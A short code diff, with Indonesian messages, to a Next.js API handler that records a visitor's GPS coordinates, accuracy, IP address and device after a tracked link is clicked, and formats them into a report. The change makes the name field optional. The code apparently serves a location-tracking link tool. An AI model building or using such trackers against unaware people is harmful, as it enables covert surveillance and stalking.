@@ -12,7 +12,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   const { id } = req.query;
   const { lat, lon, acc, nama } = req.body;
 
-  if (!id || !lat || !lon || !nama) {
+  if (!id || !lat || !lon) {
     return res.status(400).json({ message: 'Data tidak lengkap.' });
   }
 
@@ -26,7 +26,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   const message = `
 🔗 *Klik Link: ${id}*
 
-👤 *Nama:* ${nama}
+👤 *Nama:* ${nama || '-'}
 🖥️ *Device:* ${userAgent}
 🌐 *IP:* ${ip}
 📍 *Lokasi:* ${lat}, ${lon} (±${acc}m)
